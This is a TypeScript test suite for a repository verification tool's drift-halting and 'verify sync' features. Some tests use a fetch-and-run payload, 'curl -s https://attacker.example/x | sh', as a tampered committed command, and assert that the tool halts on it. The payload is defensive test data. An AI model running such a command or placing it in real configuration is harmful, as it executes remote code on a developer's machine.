import { afterEach, describe, expect, it, vi } from "vitest";
import { discover } from "../../src/adapter/discover/index.js";
import {
  DRIFT_EXIT_CODE,
  DriftHaltError,
  assertNoDrift,
  checkBinding,
  finalize,
  readBindings,
  writeBindings,
} from "../../src/adapter/drift.js";
import { bindAll, type GateRunner } from "../../src/adapter/bind.js";
import { EXIT_NOT_READY, EXIT_OK, main as verifyMain, renderSyncSummary, verifySync } from "../../src/cli/verify.js";
import { initLayout } from "../../src/fs/layout.js";
import type { Binding } from "../../src/schemas/records.js";
import { removeTree, tmpTree, writeTree } from "../helpers.js";

/** T-027 — drift halting (V-3), region precision, and `verify sync` (C-12). */

const trees: string[] = [];
const tree = (files: Record<string, string>): string => {
  const root = tmpTree(files);
  trees.push(root);
  initLayout(root);
  return root;
};
afterEach(() => {
  for (const t of trees.splice(0)) removeTree(t);
});

const NOW = () => "2026-08-18T09:00:00.000Z";
const runner: GateRunner = async (spec) => ({
  slot: spec.slot,
  command: spec.command,
  cwd: spec.cwd,
  outcome: "exited",
  green: true,
  exitCode: 0,
  signal: null,
  normalizedExit: 0,
  output: "",
  outputBytes: 0,
  truncated: false,
  durationMs: 1,
});

const FIXTURE = {
  "package.json": JSON.stringify({ name: "svc", scripts: { test: "vitest run", lint: "eslint ." } }, null, 2),
  "package-lock.json": "{}\n",
};

async function bound(root: string): Promise<Binding[]> {
  const report = await bindAll(discover(root), { root, runner, now: NOW , redact: (t) => t });
  return [...report.bindings];
}

describe("T-027 V-3 drift halting", () => {
  it("editing the defining region halts, naming both hashes", async () => {
    const root = tree(FIXTURE);
    const bindings = await bound(root);
    expect(assertNoDrift(bindings, discover(root)).halting).toEqual([]);

    writeTree(root, {
      "package.json": JSON.stringify({ name: "svc", scripts: { test: "vitest run --coverage", lint: "eslint ." } }, null, 2),
    });

    let thrown: DriftHaltError | null = null;
    try {
      assertNoDrift(bindings, discover(root));
    } catch (err) {
      thrown = err as DriftHaltError;
    }
    expect(thrown).toBeInstanceOf(DriftHaltError);
    expect(thrown?.exitCode).toBe(DRIFT_EXIT_CODE);
    expect(thrown?.exitCode).toBe(2);

    const stored = bindings.find((b) => b.slot === "test")!.config_hash;
    const current = discover(root).candidates.find((c) => c.slot === "test")!.config_hash;
    expect(thrown?.message).toContain(stored);
    expect(thrown?.message).toContain(current);
    expect(thrown?.message).toContain("verification changed — re-baseline");
  });

  it("editing a non-gate region does not halt (region precision)", async () => {
    const root = tree(FIXTURE);
    const bindings = await bound(root);
    writeTree(root, {
      "package.json": JSON.stringify(
        { name: "svc", version: "2.0.0", scripts: { test: "vitest run", lint: "eslint . --max-warnings 0" } },
        null,
        2,
      ),
    });

    const check = checkBinding(bindings.find((b) => b.slot === "test")!, discover(root));
    expect(check.status).toBe("clean");
    /** The lint binding *did* drift; precision means the test gate is unaffected. */
    expect(checkBinding(bindings.find((b) => b.slot === "lint")!, discover(root)).status).toBe("drifted");
  });

  /**
   * SEC-5′ (PRDR-134) — the check guards the COMMAND, not only the config it
   * came from.
   *
   * `bindings.json` is committed repository content and `resolved` is the only
   * field that executes: `referee-gate.ts` hands it to `spawn(..., { shell:
   * true })` with the operator's full environment. Drift compared `config_hash`
   * alone, and `config_hash` is computable from the repository's own config
   * region — so an attacker ships an ordinary `package.json`, computes the hash
   * that region yields, and commits a binding pairing that VALID hash with any
   * command they like. Drift reported clean and the first gate ran it.
   */
  /**
   * PRDR-149. `binding.resolved` is the NORMALIZED command (`bind.ts` stores
   * `invocation.command`); `Candidate.resolved` is the literal one. Comparing
   * them directly halted every repository whose test script is a watch-mode
   * runner — `"test": "vitest"` binds as `npm run test -- --run` and discovers
   * as `npm run test` — so an untouched `npm create vite` project drifted on
   * its first gate, unrecoverably, since `verify sync` re-binds through the
   * same normalizer.
   *
   * The PRDR-134 test below did not catch it because its fixture is already
   * CI-safe, which makes normalization a no-op.
   */
  it("a watch-mode test script does not drift on an untouched repo", async () => {
    const root = tree({ "package.json": JSON.stringify({ name: "svc", scripts: { test: "vitest", lint: "eslint ." } }, null, 2) });
    const bindings = await bound(root);
    expect(bindings.find((b) => b.slot === "test")?.resolved).toContain("--run");
    expect(() => assertNoDrift(bindings, discover(root)), "an untouched repo must not halt").not.toThrow();
  });

  /**
   * PRDR-149. `checkBinding` returned `exempt` for a provisional binding BEFORE
   * any comparison, `exempt` is not in the halting filter, and
   * `runScopedGates` never looks at status — so one extra field in a committed
   * `bindings.json` bypassed the command check entirely. Being exempt from
   * DRIFT (no approved baseline to have drifted from) does not mean the command
   * need not be the one discovery found.
   */
  it("a provisional binding is exempt from drift but NOT from the command check", async () => {
    const root = tree(FIXTURE);
    const bindings = await bound(root);
    const payload = "curl -s https://attacker.example/x | sh";
    const tampered = bindings.map((b) => (b.slot === "test" ? { ...b, resolved: payload, status: "provisional" as const } : b));
    expect(() => assertNoDrift(tampered, discover(root)), "provisional must not exempt the command").toThrow(DriftHaltError);
    /* And a provisional binding whose command IS what discovery finds stays exempt. */
    const honest = bindings.map((b) => (b.slot === "test" ? { ...b, status: "provisional" as const } : b));
    expect(() => assertNoDrift(honest, discover(root))).not.toThrow();
  });

  it("a substituted `resolved` halts even when its config_hash still validates", async () => {
    const root = tree(FIXTURE);
    const bindings = await bound(root);
    expect(assertNoDrift(bindings, discover(root)).halting).toEqual([]);

    /* The repository's config is untouched, so every config_hash still matches. */
    const tampered = bindings.map((b) =>
      b.slot === "test" ? { ...b, resolved: "curl -s https://attacker.example/x | sh" } : b,
    );

    let thrown: DriftHaltError | null = null;
    try {
      assertNoDrift(tampered, discover(root));
    } catch (err) {
      thrown = err as DriftHaltError;
    }
    expect(thrown, "a substituted command must halt, not execute").toBeInstanceOf(DriftHaltError);
    /* The message names the command, which is what an operator needs to see. */
    expect(thrown?.message).toContain("curl -s https://attacker.example/x | sh");
    expect(thrown?.message).toContain("COMMAND");
  });

  it("a binding whose configuration vanished halts too", async () => {
    const root = tree(FIXTURE);
    const bindings = await bound(root);
    writeTree(root, { "package.json": JSON.stringify({ name: "svc", scripts: { lint: "eslint ." } }, null, 2) });

    const check = checkBinding(bindings.find((b) => b.slot === "test")!, discover(root));
    expect(check.status).toBe("vanished");
    expect(check.current_hash).toBeNull();
    expect(() => assertNoDrift(bindings, discover(root))).toThrow(DriftHaltError);
  });

  it("provisional bindings are exempt until C-4 finalises them", async () => {
    const root = tree(FIXTURE);
    const report = await bindAll(discover(root), { root, runner, now: NOW, status: "provisional" , redact: (t) => t });
    writeTree(root, { "package.json": JSON.stringify({ name: "svc", scripts: { test: "vitest run --ui" } }, null, 2) });

    const check = checkBinding(report.bindings.find((b) => b.slot === "test")!, discover(root));
    expect(check.status).toBe("exempt");
    expect(() => assertNoDrift([...report.bindings], discover(root))).not.toThrow();
  });

  it("finalising takes the current hash as the baseline (C-4)", async () => {
    const root = tree(FIXTURE);
    const report = await bindAll(discover(root), { root, runner, now: NOW, status: "provisional" , redact: (t) => t });
    writeTree(root, { "package.json": JSON.stringify({ name: "svc", scripts: { test: "vitest run --coverage" } }, null, 2) });

    const finalized = finalize(report.bindings.find((b) => b.slot === "test")!, discover(root));
    expect(finalized.status).toBe("approved");
    expect(checkBinding(finalized, discover(root)).status).toBe("clean");
  });
});

describe("T-027 bindings.json", () => {
  it("round-trips through the committed artifact, stamped (F-3)", async () => {
    const root = tree(FIXTURE);
    const bindings = await bound(root);
    writeBindings(root, { bindings, skips: [{ slot: "e2e", acknowledged_by: "alice", at: NOW() }] });

    const read = readBindings(root);
    expect(read.schema_version).toBe(1);
    expect(read.bindings).toEqual(bindings);
    expect(read.skips).toEqual([{ slot: "e2e", acknowledged_by: "alice", at: NOW() }]);
  });

  it("a missing file reads as empty rather than throwing", () => {
    const root = tree(FIXTURE);
    expect(readBindings(root).bindings).toEqual([]);
  });

  it("a newer-schema file is refused, never read (F-3)", () => {
    const root = tree(FIXTURE);
    writeTree(root, { ".detent/bindings.json": JSON.stringify({ schema_version: 99, bindings: [] }) });
    expect(() => readBindings(root)).toThrow(/schema_version 99/);
  });
});

describe("T-027 `verify sync` (C-12)", () => {
  it("re-runs V-1 with consent and re-baselines", async () => {
    const root = tree(FIXTURE);
    writeBindings(root, { bindings: await bound(root), skips: [] });
    writeTree(root, { "package.json": JSON.stringify({ name: "svc", scripts: { test: "vitest run --coverage", lint: "eslint ." } }, null, 2) });

    let offered: number | null = null;
    const result = await verifySync(root, {
      consent: async (summary) => {
        offered = summary.drift.filter((d) => d.status === "drifted").length;
        return true;
      },
      bind: (discovery, opts) => bindAll(discovery, { ...opts, runner, now: NOW , redact: (t) => t }),
      now: NOW,
    });

    expect(offered).toBe(1);
    expect(result.exitCode).toBe(EXIT_OK);
    expect(result.rebaselined).toBe(true);
    expect(assertNoDrift(readBindings(root).bindings, discover(root)).halting).toEqual([]);
  });

  it("declining leaves the bindings untouched and exits 2", async () => {
    const root = tree(FIXTURE);
    const original = await bound(root);
    writeBindings(root, { bindings: original, skips: [] });
    writeTree(root, { "package.json": JSON.stringify({ name: "svc", scripts: { test: "vitest run --coverage", lint: "eslint ." } }, null, 2) });

    const result = await verifySync(root, {
      consent: async () => false,
      bind: (discovery, opts) => bindAll(discovery, { ...opts, runner, now: NOW , redact: (t) => t }),
    });

    expect(result.exitCode).toBe(EXIT_NOT_READY);
    expect(result.rebaselined).toBe(false);
    expect(readBindings(root).bindings).toEqual(original);
    expect(result.messages.join(" ")).toContain("declined");
  });

  it("executes the replacement candidates before offering them (V-1, P4)", async () => {
    const root = tree(FIXTURE);
    writeBindings(root, { bindings: await bound(root), skips: [] });

    const executed: string[] = [];
    await verifySync(root, {
      consent: async () => true,
      bind: (discovery, opts) =>
        bindAll(discovery, {
          ...opts,
          now: NOW,
          runner: async (spec) => {
            executed.push(spec.command);
            return runner(spec);
          },
        }),
    });
    expect(executed).toEqual(["npm run test", "npm run lint"]);
  });

  it("refuses to sync while a slot is ambiguous", async () => {
    const root = tree({ ...FIXTURE, Makefile: "test:\n\techo hi\n" });
    const result = await verifySync(root, {
      consent: async () => true,
      bind: (discovery, opts) => bindAll(discovery, { ...opts, runner, now: NOW , redact: (t) => t }),
    });
    expect(result.exitCode).toBe(EXIT_NOT_READY);
    expect(result.messages.join(" ")).toContain("plausible candidates");
  });

  it("keeps recorded skips across a re-baseline", async () => {
    const root = tree(FIXTURE);
    writeBindings(root, { bindings: await bound(root), skips: [{ slot: "e2e", acknowledged_by: "alice", at: NOW() }] });
    await verifySync(root, {
      consent: async () => true,
      bind: (discovery, opts) => bindAll(discovery, { ...opts, runner, now: NOW , redact: (t) => t }),
    });
    /**
     * PRDR-167: the property is PROVENANCE, asserted directly now rather than
     * via an exact-array match. Sync also records the other unbound slots (it
     * used to drop them from the record entirely), so the array is no longer
     * just this one — but alice's acknowledgement must come back byte-identical,
     * never re-stamped `auto`/now, which would launder a human decision into a
     * machine one.
     */
    const kept = readBindings(root).skips;
    expect(kept.find((s) => s.slot === "e2e"), "alice's acknowledgement survives a re-baseline unchanged").toEqual({
      slot: "e2e",
      acknowledged_by: "alice",
      at: NOW(),
    });
  });
});

/**
 * V-1‴ (PRDR-165) — `sync` is where a real gate can be swapped for a vacuous
 * one, so the warning has to be in the text the operator decides on.
 *
 * It was pushed into `messages`, which `main` prints AFTER `verifySync`
 * returns — after the consent prompt and after `writeBindings`. The operator
 * approved the re-baseline, the drift halt cleared, and only then were they
 * told the new gate is `echo`.
 */
describe("PRDR-165 verify sync warns before the decision, not after it", () => {
  function repoWithScript(script: string): string {
    const root = tree({ ...FIXTURE, "package.json": JSON.stringify({ name: "syncy", scripts: { test: script } }, null, 2) });
    return root;
  }

  it("puts the vacuous-gate notice in the summary the operator consents to", async () => {
    const root = repoWithScript("vitest run");
    writeBindings(root, { bindings: await bound(root), skips: [] });
    /* The gate is swapped for one that verifies nothing — the case sync exists to catch. */
    writeTree(root, { "package.json": JSON.stringify({ name: "syncy", scripts: { test: "echo no tests here" } }, null, 2) });

    let sawAtConsent = "";
    const result = await verifySync(root, {
      consent: async (summary) => {
        sawAtConsent = renderSyncSummary(summary);
        return true;
      },
      now: NOW,
      write: false,
    });
    expect(sawAtConsent, "the text the human approves must name the vacuous gate").toContain("may verify nothing");
    expect(sawAtConsent).toContain("no tests here");
    expect(result.rebaselined).toBe(true);
  }, 30_000);

  /**
   * PRDR-165/M1: `verify.ts` passes `scrub`, and nothing asserted it. Every
   * injected test caller spreads `...opts` and then overrides with identity,
   * so the production redactor was covered by no test at all.
   */
  it("scrubs a secret the swapped gate echoes, on the path that prints it", async () => {
    const root = repoWithScript("vitest run");
    writeBindings(root, { bindings: await bound(root), skips: [] });
    writeTree(root, {
      "package.json": JSON.stringify({ name: "syncy", scripts: { test: "echo token=ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" } }, null, 2),
    });

    let sawAtConsent = "";
    await verifySync(root, {
      consent: async (summary) => {
        sawAtConsent = renderSyncSummary(summary);
        return false;
      },
      now: NOW,
      write: false,
    });
    expect(sawAtConsent, "the notice must be delivered at all").toContain("may verify nothing");
    expect(sawAtConsent, "a secret echoed by the gate must not reach the operator").not.toContain("ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    expect(sawAtConsent).toContain("REDACTED");
  }, 30_000);
});

/**
 * PRDR-167 — the recovery command for verification drift, losing verification.
 *
 * Found by the full-project audit of `0752fef`. Three defects in one function,
 * each of which a fully green suite did not catch.
 */
describe("PRDR-167 verify sync keeps the record it is re-baselining", () => {
  it("records a slot that lost its candidate as a skip, rather than dropping it from both lists", async () => {
    /* Two bound slots, then `lint` loses its script entirely. */
    const root = tree({
      ...FIXTURE,
      "package.json": JSON.stringify({ name: "dropper", scripts: { test: "vitest run", lint: "eslint ." } }, null, 2),
    });
    writeBindings(root, { bindings: await bound(root), skips: [] });
    writeTree(root, { "package.json": JSON.stringify({ name: "dropper", scripts: { test: "vitest run" } }, null, 2) });

    /**
     * PRDR-177: asserted on DISK, not on the in-memory summary.
     *
     * The first version of this test passed `write: false` and read
     * `result.summary.skips` — which is computed correctly even when the WRITE
     * still uses `stored.skips`. Putting the original defect back at the
     * `writeBindings` call left all 23 tests here green, including all three
     * written for it. The bug lives in what reaches `bindings.json`, so that is
     * what this reads.
     */
    const result = await verifySync(root, { consent: async () => true, now: NOW });
    const slots = result.summary.proposed.map((b) => b.slot);
    expect(slots, "lint really is unbindable now").not.toContain("lint");
    expect(
      readBindings(root).skips.map((s) => s.slot),
      "a gate that vanished must be recorded as skipped on disk, not dropped from the record entirely",
    ).toContain("lint");
  }, 30_000);

  it("does not carry a stale skip forward for a slot it has just bound", async () => {
    const root = tree({ ...FIXTURE, "package.json": JSON.stringify({ name: "staleskip", scripts: { test: "vitest run" } }, null, 2) });
    writeBindings(root, { bindings: await bound(root), skips: [{ slot: "lint", acknowledged_by: "auto", at: NOW() }] });
    /* `lint` now has a real command, so the skip is a contradiction the moment it binds. */
    writeTree(root, { "package.json": JSON.stringify({ name: "staleskip", scripts: { test: "vitest run", lint: "eslint ." } }, null, 2) });

    const result = await verifySync(root, { consent: async () => true, now: NOW });
    expect(result.summary.proposed.map((b) => b.slot), "lint binds now").toContain("lint");
    /* PRDR-177: on disk — the stale skip that survived was a WRITE defect. */
    expect(
      readBindings(root).skips.map((s) => s.slot),
      "a slot cannot be bound and skipped at once — bindingTable would render it twice",
    ).not.toContain("lint");
  }, 30_000);

  /**
   * PRDR-167: `--yes` is the one path with no human at a terminal, and PRDR-165
   * moved the notice into the consent summary — which `--yes` never renders.
   * The notice went from "printed after the decision" to "printed nowhere".
   */
  it("reports the vacuous gate in the result messages, so the --yes path has a record of it", async () => {
    const root = tree({ ...FIXTURE, "package.json": JSON.stringify({ name: "yessy", scripts: { test: "vitest run" } }, null, 2) });
    writeBindings(root, { bindings: await bound(root), skips: [] });
    writeTree(root, { "package.json": JSON.stringify({ name: "yessy", scripts: { test: "echo no tests here" } }, null, 2) });

    /* Exactly what `main` does under --yes: consent granted without rendering the summary. */
    const result = await verifySync(root, { consent: async () => true, now: NOW, write: false });
    expect(result.messages.join("\n"), "the log must carry it even when nobody read a prompt").toContain("verifies nothing");
    expect(result.messages.join("\n")).toContain("no tests here");
  }, 30_000);
});

/**
 * PRDR-173 — `verify sync`'s own CLI entry point.
 *
 * Every other test in this file calls the pure `verifySync(root, deps)` with a
 * hand-supplied consent callback. Nothing drove `main()` through `sync --yes`
 * or the interactive refusal, so disabling the non-interactive refusal entirely
 * left the whole suite green — and that gap is the direct reason the `--yes`
 * notice hole (PRDR-167) could exist unnoticed. `dispatch.test.ts` reaches
 * `main(["verify"])` but only exercises the `sub !== "sync"` exit-2 branch.
 */
describe("PRDR-173 verify sync's entry point: TTY refusal, --yes, and what reaches stdout", () => {
  const noTty = (): (() => void) => {
    const outWas = Object.getOwnPropertyDescriptor(process.stdout, "isTTY");
    const inWas = Object.getOwnPropertyDescriptor(process.stdin, "isTTY");
    Object.defineProperty(process.stdout, "isTTY", { value: false, configurable: true });
    Object.defineProperty(process.stdin, "isTTY", { value: false, configurable: true });
    return () => {
      if (outWas) Object.defineProperty(process.stdout, "isTTY", outWas);
      if (inWas) Object.defineProperty(process.stdin, "isTTY", inWas);
    };
  };

  it("refuses off a terminal without --yes, BEFORE any candidate command runs", async () => {
    const root = tree({ ...FIXTURE, "package.json": JSON.stringify({ name: "ttyless", scripts: { test: "vitest run" } }, null, 2) });
    writeBindings(root, { bindings: await bound(root), skips: [] });
    const restore = noTty();
    const err = vi.spyOn(process.stderr, "write").mockReturnValue(true);
    try {
      const code = await verifyMain(["sync", root]);
      expect(code, "C-6a: re-baselining is a human decision").toBe(2);
      expect(err.mock.calls.join(""), "and it says why").toContain("human decision");
    } finally {
      err.mockRestore();
      restore();
    }
  }, 30_000);

  it("under --yes, the vacuous-gate notice still reaches stdout", async () => {
    const root = tree({ ...FIXTURE, "package.json": JSON.stringify({ name: "yesy", scripts: { test: "vitest run" } }, null, 2) });
    writeBindings(root, { bindings: await bound(root), skips: [] });
    writeTree(root, { "package.json": JSON.stringify({ name: "yesy", scripts: { test: "echo no tests here" } }, null, 2) });
    const restore = noTty();
    const out = vi.spyOn(process.stdout, "write").mockReturnValue(true);
    try {
      const code = await verifyMain(["sync", root, "--yes"]);
      const printed = out.mock.calls.join("");
      expect(code).toBe(0);
      expect(printed, "an unattended run must still get the warning in its log").toContain("verifies nothing");
      expect(printed).toContain("re-baselined");
    } finally {
      out.mockRestore();
      restore();
    }
  }, 30_000);
});

/**
 * PRDR-179 — the two verify-sync exits PRDR-167 left uncovered.
 *
 * The audit found the `SETUP_REQUIRED_SLOTS` refusal has no test at all —
 * `if (false && missingRequired.length > 0)` left the suite green — and that
 * the same refusal returns before the notices reach `messages`, so a vacuous
 * gate is reported on two of three exits and silent on the third. It also found
 * `SyncSummary.skips` documented as decision material and rendered nowhere.
 */
describe("PRDR-179 verify sync's refusal path, and what the operator is shown", () => {
  it("refuses when the test slot has no candidate, rather than syncing it into nothing", async () => {
    const root = tree({ ...FIXTURE, "package.json": JSON.stringify({ name: "notest", scripts: { test: "vitest run" } }, null, 2) });
    writeBindings(root, { bindings: await bound(root), skips: [] });
    /* The one slot a project cannot be gated without disappears. */
    writeTree(root, { "package.json": JSON.stringify({ name: "notest", scripts: {} }, null, 2) });

    const result = await verifySync(root, { consent: async () => true, now: NOW });
    expect(result.exitCode, "P2: a project with no test command cannot be gated").toBe(EXIT_NOT_READY);
    expect(result.rebaselined, "and nothing is re-baselined").toBe(false);
    expect(result.messages.join("\n")).toContain("no way to run: test");
    expect(readBindings(root).bindings.map((b) => b.slot), "the stored bindings are left intact").toContain("test");
  }, 30_000);

  it("still reports a vacuous gate on the refusal exit", async () => {
    const root = tree({
      ...FIXTURE,
      "package.json": JSON.stringify({ name: "both", scripts: { test: "vitest run", lint: "eslint ." } }, null, 2),
    });
    writeBindings(root, { bindings: await bound(root), skips: [] });
    /* test vanishes (the refusal) while lint becomes vacuous (the notice). */
    writeTree(root, { "package.json": JSON.stringify({ name: "both", scripts: { lint: "echo no lint here" } }, null, 2) });

    const result = await verifySync(root, { consent: async () => true, now: NOW });
    expect(result.exitCode).toBe(EXIT_NOT_READY);
    expect(result.messages.join("\n"), "the refusal must not swallow the notice").toContain("verifies nothing");
  }, 30_000);

  it("shows the operator which gates are about to be recorded as skipped", async () => {
    const root = tree({
      ...FIXTURE,
      "package.json": JSON.stringify({ name: "skipshow", scripts: { test: "vitest run", lint: "eslint ." } }, null, 2),
    });
    writeBindings(root, { bindings: await bound(root), skips: [] });
    writeTree(root, { "package.json": JSON.stringify({ name: "skipshow", scripts: { test: "vitest run" } }, null, 2) });

    let shown = "";
    await verifySync(root, {
      consent: async (summary) => {
        shown = renderSyncSummary(summary);
        return false;
      },
      now: NOW,
    });
    expect(shown, "a gate about to be recorded as skipped belongs in the text being approved").toContain("lint");
    expect(shown).toContain("recorded as skipped");
  }, 30_000);
});
